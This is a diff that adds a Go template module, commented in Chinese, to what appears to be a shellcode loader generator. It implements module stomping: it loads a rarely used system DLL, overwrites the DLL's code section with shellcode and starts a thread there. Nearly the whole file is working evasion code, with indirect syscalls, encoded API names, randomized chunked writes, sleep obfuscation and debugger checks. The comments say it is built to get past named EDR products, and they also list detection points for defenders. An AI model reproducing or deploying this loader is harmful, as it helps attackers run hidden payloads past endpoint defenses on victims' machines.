@@ -1,0 +1,273 @@
+{{define "_stomping"}}
+{{if ne .StompDLL ""}}
+// ============================================================
+// Module Stomping — v2.0 内存伪装模块
+// ============================================================
+//
+// 【问题背景 — 为什么需要 Module Stomping】
+//   传统 shellcode 加载使用 VirtualAlloc 分配 private 内存（MEM_COMMIT | MEM_RESERVE），
+//   然后将权限改为 RX 执行。这种内存在 Windows 内存管理器中标记为 MEM_PRIVATE，
+//   没有任何文件背书（unbacked memory）。
+//
+//   2024-2026 EDR 的核心检测手段之一就是扫描 unbacked RX/RWX 内存：
+//   - Microsoft Defender ATP: 周期性扫描所有进程的 VAD（Virtual Address Descriptor）树，
+//     标记 MEM_PRIVATE + PAGE_EXECUTE_* 的区域为可疑
+//   - SentinelOne: 实时监控 VirtualProtect/NtProtectVirtualMemory 调用，
+//     当 private 内存从 RW 变为 RX 时触发深度扫描
+//   - CrowdStrike Falcon: 结合 ETW TI 和内核回调，
+//     检测 unbacked 内存中的 syscall 指令和 shellcode 特征
+//
+// 【Module Stomping 原理】
+//   1. 使用 LoadLibraryA 加载一个合法但不常用的 DLL（如 winhttp.dll、amstream.dll）
+//   2. 解析该 DLL 的 PE 头，定位其 .text（代码）段
+//   3. 将 .text 段权限改为 RW，用 shellcode 覆盖原始代码
+//   4. 恢复为 RX 权限
+//   5. 在 .text 段基址创建线程执行
+//
+//   关键优势：被覆写的内存仍然是 MEM_IMAGE 类型（有文件背书），
+//   在 VAD 树中显示为合法 DLL 的代码段，而非 private 内存。
+//   EDR 的 unbacked memory 扫描会跳过这些区域。
+//
+// 【为什么 2026 年仍然有效】
+//   - VAD 类型检查是 O(1) 操作，EDR 大量依赖它做初筛
+//   - 逐页比对 DLL 磁盘文件与内存内容（page hash verification）成本极高，
+//     大多数 EDR 仅在高置信度告警后才执行
+//   - 选择不常用的 DLL 降低了被主动监控的概率
+//
+// 【EDR 检测锚点 — 蓝队参考】
+//   - ETW TI: NtProtectVirtualMemory 修改 MEM_IMAGE 区域权限（RX→RW→RX）
+//     正常 DLL 加载后不应修改 .text 段权限
+//   - 页面哈希校验: 将内存中的 .text 段与磁盘文件做哈希比对
+//     如果不一致，说明代码被篡改（stomped）
+//     【局限】性能开销大，通常仅在告警后触发
+//   - Sysmon EventID 7 (Image Loaded): 加载不常见 DLL 后立即执行可疑行为
+//   - 调用栈分析: 线程起始地址在已知 DLL 的 .text 段内，
+//     但执行的代码与该 DLL 的导出函数不匹配
+//   - YARA: 检测 LoadLibraryA + PE 解析 + VirtualProtect 组合模式
+//   - 内存扫描时机: 部分 EDR 在 LoadLibrary 后短暂窗口内扫描新加载模块
+//     【对策】加载后等待随机延迟再覆写
+
+// moduleStompExec 通过 Module Stomping 技术执行 shellcode
+//
+// 流程：
+//   1. LoadLibraryA 加载牺牲 DLL（编译时指定）
+//   2. 解析 PE 头定位 .text 段（虚拟地址 + 大小）
+//   3. 校验 .text 段大小 >= shellcode 大小
+//   4. NtProtectVirtualMemory 将 .text 段改为 RW
+//   5. 覆写 shellcode（分块 + 随机延迟，降低行为特征）
+//   6. NtProtectVirtualMemory 恢复为 RX
+//   7. 在 .text 段基址创建线程执行
+//
+// 参数：
+//   shellcode — 待执行的 shellcode 字节
+//
+// 返回：
+//   true  — stomping 执行成功
+//   false — 失败（DLL 加载失败、.text 段太小等），调用方应回退到常规执行
+func moduleStompExec(shellcode []byte) bool {
+	k32 := kernel32()
+
+	// ── 1. 加载牺牲 DLL ──
+	// 使用 LoadLibraryA 而非 LoadLibraryW，与 ds() 返回的 ASCII 字符串兼容
+	// 选择不常用的系统 DLL，降低被 EDR 主动监控的概率
+	// 【检测点】Sysmon EventID 7: 加载不常见 DLL
+	loadLib := getProcAddr(k32, ds("{{index .EncodedStrings "LoadLibraryA"}}"))
+	if loadLib == 0 {
+		return false
+	}
+
+	dllName, _ := syscall.BytePtrFromString(stompDLL)
+	hModule, _, _ := syscall.Syscall(loadLib, 1, uintptr(unsafe.Pointer(dllName)), 0, 0)
+	if hModule == 0 {
+		return false
+	}
+
+	// 加载后随机延迟，避免 "加载后立即修改" 的时序特征
+	// 【检测点】部分 EDR 在 LoadLibrary 后短暂窗口内扫描新模块
+	time.Sleep(time.Duration(200+rand.Intn(500)) * time.Millisecond)
+
+	// ── 2. 解析 PE 头定位 .text 段 ──
+	// 复用 _structs.go.tmpl 中定义的 PE 结构体
+	dosHeader := (*IMAGE_DOS_HEADER)(unsafe.Pointer(hModule))
+	if dosHeader.Magic != 0x5A4D { // "MZ"
+		return false
+	}
+	ntHeaders := (*IMAGE_NT_HEADERS)(unsafe.Pointer(hModule + uintptr(dosHeader.LfaNew)))
+	if ntHeaders.Signature != 0x00004550 { // "PE\0\0"
+		return false
+	}
+
+	// 遍历 section headers 查找 .text 段
+	sectionOffset := uintptr(dosHeader.LfaNew) + 4 + 20 + uintptr(ntHeaders.FileHeader.SizeOfOptionalHeader)
+	var textAddr uintptr
+	var textSize uintptr
+	for i := uint16(0); i < ntHeaders.FileHeader.NumberOfSections; i++ {
+		sh := (*IMAGE_SECTION_HEADER)(unsafe.Pointer(hModule + sectionOffset + uintptr(i)*40))
+		if string(sh.Name[:5]) == ".text" {
+			textAddr = hModule + uintptr(sh.VirtualAddress)
+			textSize = uintptr(sh.VirtualSize)
+			break
+		}
+	}
+	if textAddr == 0 || textSize == 0 {
+		return false
+	}
+
+	// ── 3. 校验 .text 段容量 ──
+	// 如果 shellcode 比 .text 段大，无法 stomp，回退到常规执行
+	if uintptr(len(shellcode)) > textSize {
+		return false
+	}
+
+	// ── 4. 修改 .text 段权限为 RW ──
+	// 【检测点】ETW TI: MEM_IMAGE 区域权限从 RX 变为 RW，这是 stomping 的核心特征
+	// 正常运行的 DLL 不应修改自己的 .text 段权限
+	var oldProtect uint32
+	getCurProc := getProcAddr(k32, ds("{{index .EncodedStrings "GetCurrentProcess"}}"))
+{{if .EnableIndirectSyscall}}
+	if getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		base := textAddr
+		regionSize := textSize
+		ret := indirectNtProtectVirtualMemory(hProc, &base, &regionSize, 0x04, &oldProtect)
+		if ret != 0 {
+			return false
+		}
+	} else {
+		return false
+	}
+{{else}}
+	ntProtect := getProcAddr(ntdll(), ds("{{index .EncodedStrings "NtProtectVirtualMemory"}}"))
+	if ntProtect != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		base := textAddr
+		regionSize := textSize
+		ret, _, _ := syscall.Syscall6(ntProtect, 5, hProc,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x04, uintptr(unsafe.Pointer(&oldProtect)), 0)
+		if ret != 0 {
+			return false
+		}
+	} else {
+		vp := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
+		if vp == 0 {
+			return false
+		}
+		ret, _, _ := syscall.Syscall6(vp, 4, textAddr, textSize, 0x04,
+			uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+		if ret == 0 {
+			return false
+		}
+	}
+{{end}}
+
+	// ── 5. 覆写 shellcode 到 .text 段 ──
+	// 先清零整个 .text 段（消除原始代码残留，降低混合特征）
+	// 然后分块写入 shellcode，加入随机延迟降低行为特征
+	textMem := (*[1 << 30]byte)(unsafe.Pointer(textAddr))[:textSize:textSize]
+	for i := range textMem {
+		textMem[i] = 0
+	}
+
+	// 分块复制 shellcode（与 executeShellcode 一致的反检测策略）
+	chunkSize := 512
+	for i := 0; i < len(shellcode); i += chunkSize {
+		end := i + chunkSize
+		if end > len(shellcode) {
+			end = len(shellcode)
+		}
+		copy(textMem[i:end], shellcode[i:end])
+		if rand.Intn(10) > 7 {
+			time.Sleep(time.Duration(rand.Intn(10)) * time.Millisecond)
+		}
+	}
+
+	// ── 6. 恢复 .text 段权限为 RX ──
+	// 【关键】恢复为 RX 而非 RWX，RWX 权限本身就是高危信号
+{{if .EnableIndirectSyscall}}
+	if getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		base := textAddr
+		regionSize := textSize
+		indirectNtProtectVirtualMemory(hProc, &base, &regionSize, 0x20, &oldProtect)
+	}
+{{else}}
+	if ntProtect != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		base := textAddr
+		regionSize := textSize
+		syscall.Syscall6(ntProtect, 5, hProc,
+			uintptr(unsafe.Pointer(&base)),
+			uintptr(unsafe.Pointer(&regionSize)),
+			0x20, uintptr(unsafe.Pointer(&oldProtect)), 0)
+	} else {
+		vp := getProcAddr(k32, ds("{{index .EncodedStrings "VirtualProtect"}}"))
+		if vp != 0 {
+			syscall.Syscall6(vp, 4, textAddr, textSize, 0x20,
+				uintptr(unsafe.Pointer(&oldProtect)), 0, 0)
+		}
+	}
+{{end}}
+
+	// ── 7. 可选睡眠混淆 ──
+	// 在执行前对 stomped 内存做 sleep obfuscation（如果启用）
+	if enableObfuscate {
+		sleepObfuscate(textAddr, uintptr(len(shellcode)))
+	}
+
+	// ── 8. 执行前二次调试检测 ──
+	if !checkDebugger() {
+		return false
+	}
+
+	time.Sleep(time.Duration(rand.Intn(100)) * time.Millisecond)
+
+	// ── 9. 在 .text 段基址创建线程执行 ──
+	// 线程起始地址指向合法 DLL 的 .text 段，调用栈看起来更正常
+	// 【检测点】线程起始地址在已知 DLL 内，但执行内容与导出函数不匹配
+	waitObj := getProcAddr(k32, ds("{{index .EncodedStrings "WaitForSingleObject"}}"))
+{{if .EnableIndirectSyscall}}
+	if getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var hThread uintptr
+		ret := indirectNtCreateThreadEx(&hThread, 0x1FFFFF, 0, hProc, textAddr, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			return true
+		}
+	}
+{{else}}
+	ntCreateThreadEx := getProcAddr(ntdll(), ds("{{index .EncodedStrings "NtCreateThreadEx"}}"))
+	if ntCreateThreadEx != 0 && getCurProc != 0 {
+		hProc, _, _ := syscall.Syscall(getCurProc, 0, 0, 0, 0)
+		var hThread uintptr
+		ret, _, _ := syscall.Syscall12(ntCreateThreadEx, 11,
+			uintptr(unsafe.Pointer(&hThread)), 0x1FFFFF, 0,
+			hProc, textAddr, 0, 0, 0, 0, 0, 0, 0)
+		if ret == 0 && hThread != 0 {
+			if waitObj != 0 {
+				syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			}
+			return true
+		}
+	}
+{{end}}
+
+	// 备选：CreateThread（Win32 层）
+	createThread := getProcAddr(k32, ds("{{index .EncodedStrings "CreateThread"}}"))
+	if createThread != 0 {
+		hThread, _, _ := syscall.Syscall6(createThread, 6, 0, 0, textAddr, 0, 0, 0)
+		if hThread != 0 && waitObj != 0 {
+			syscall.Syscall(waitObj, 2, hThread, 0xFFFFFFFF, 0)
+			return true
+		}
+	}
+
+	// 最后备选：回调执行
+	return executeViaCallback(textAddr)
+}
+{{end}}
+{{end}}
